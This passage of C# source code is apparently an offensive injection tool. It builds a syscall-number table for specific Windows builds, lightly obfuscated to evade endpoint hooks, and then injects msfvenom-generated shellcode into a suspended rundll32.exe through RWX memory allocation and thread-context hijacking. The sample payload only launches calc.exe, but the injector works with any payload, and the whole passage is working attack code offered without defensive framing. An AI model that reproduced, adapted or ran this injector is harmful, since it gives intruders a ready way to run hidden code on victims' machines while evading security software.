										for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }

										var syscallIdentifierBytes = BitConverter.GetBytes(0x129);
										Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint));

										} else
									// NtResumeThread
									if (sysType == 9) { syscall[4] = 083; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
									// NtWaitForSingleObject
									if (sysType == 10) { syscall[4] = 005; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }}
							} else
							if ((osVersionInfo.dwPlatformId == 2) & (osVersionInfo.dwBuildNumber == 17763)) // 1809
							{
									// ZwOpenProcess
									if (sysType == 1) { syscall[4] = 039; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
									// NtCreateThreadEx
									if (sysType == 2) { syscall[4] = 189; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
									// ZwWriteVirtualMemory
									if (sysType == 3) { syscall[4] = 059; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
									// NtAllocateVirtualMemory
									if (sysType == 4) { syscall[4] = 025; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
									// NtCreateSection
									if (sysType == 5) { syscall[4] = 075; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
									// NtMapViewOfSection
									if (sysType == 6) { syscall[4] = 041; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
									// ZwCreateProcess
									if (sysType == 7) { syscall[4] = 181; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
									// NtOpenThread
									if (sysType == 8) {
										//syscall[4] = 1;
										for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }

										var syscallIdentifierBytes = BitConverter.GetBytes(0x129);
										Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint));

										} else
									// NtResumeThread
									if (sysType == 9) { syscall[4] = 083; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
									// NtWaitForSingleObject
									if (sysType == 10) { syscall[4] = 005; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }}
							}
							return syscall;
			}


    public static void Main(string[] args)
    {
				CONTEXT64 context = new CONTEXT64();
				// shellcode = msfvenom --payload windows/x64/exec CMD="calc.exe" EXITFUNC=thread -f vbapplication
				byte[] shellcode = new byte[275] { 72,131,228,240,232,192,0,0,0,65,81,65,80,82,81,86,72,49,210,101,72,139,82,96,72,139,82,24,72,139,82,32,72,139,114,80,72,15,183,74,74,77,49,201,72,49,192,172,60,97,124,2,44,32,65,193,201,13,65,1,193,226,237,82,65,81,72,139,82,32,139,66,60,72,1,208,139,128,136,0,0,0,72,133,192,116,103,72,1,208,80,139,72,24,68,139,64,32,73,1,208,227,86,72,255,201,65,139,52,136,72,1,214,77,49,201,72,49,192,172,65,193,201,13,65,1,193,56,224,117,241,76,3,76,36,8,69,57,209,117,216,88,68,139,64,36,73,1,208,102,65,139,12,72,68,139,64,28,73,1,208,65,139,4,136,72,1,208,65,88,65,88,94,89,90,65,88,65,89,65,90,72,131,236,32,65,82,255,224,88,65,89,90,72,139,18,233,87,255,255,255,93,72,186,1,0,0,0,0,0,0,0,72,141,141,1,1,0,0,65,186,49,139,111,135,255,213,187,224,29,42,10,65,186,166,149,189,157,255,213,72,131,196,40,60,6,124,10,128,251,224,117,5,187,71,19,114,111,106,0,89,65,137,218,255,213,99,97,108,99,46,101,120,101,0 };
				string PayloadPath = "C:\\Windows\\System32\\rundll32.exe";
				STARTUPINFO StartupInfo = new STARTUPINFO();
				PROCESS_INFORMATION ProcessInformation = new PROCESS_INFORMATION();
				int result = CreateProcess( null, PayloadPath, IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, System.IO.Path.GetDirectoryName(PayloadPath), ref StartupInfo, ref ProcessInformation);
				IntPtr procHandle = ProcessInformation.hProcess;
				IntPtr ptrOpenThread = OpenThread(ThreadAccess.THREAD_SUSPEND, false, (uint)ProcessInformation.dwThreadId);
				context.ContextFlags = CONTEXT_FLAGS.CONTEXT_FULL;
				GetThreadContext(ptrOpenThread, ref context);
				IntPtr allocMemAddress = new IntPtr();
				UIntPtr scodeSize = (UIntPtr)(UInt32)((shellcode.Length));
				NtAllocateVirtualMemory(procHandle, ref allocMemAddress, new IntPtr(0), ref scodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
				IntPtr bytesWritten  = IntPtr.Zero;
    		IntPtr unmanagedPointer = Marshal.AllocHGlobal(shellcode.Length);
				Marshal.Copy(shellcode, 0, unmanagedPointer, shellcode.Length);
				NtWriteVirtualMemory(procHandle, ref allocMemAddress, unmanagedPointer, (UInt32)(scodeSize), ref bytesWritten);
				Marshal.FreeHGlobal(unmanagedPointer);
				context.Rip = (ulong)allocMemAddress.ToInt64();
				SetThreadContext(ptrOpenThread, ref context);
				ResumeThread(ptrOpenThread);
    }
}


```
